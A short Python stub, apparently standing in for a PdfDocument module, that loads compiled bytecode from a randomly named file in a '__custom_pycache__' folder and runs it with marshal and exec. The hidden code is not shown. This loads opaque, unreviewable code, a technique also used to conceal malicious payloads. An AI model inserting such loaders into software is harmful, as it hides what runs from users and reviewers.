
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfDocument_ed973c3b9d08420984466ac053b075f0.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
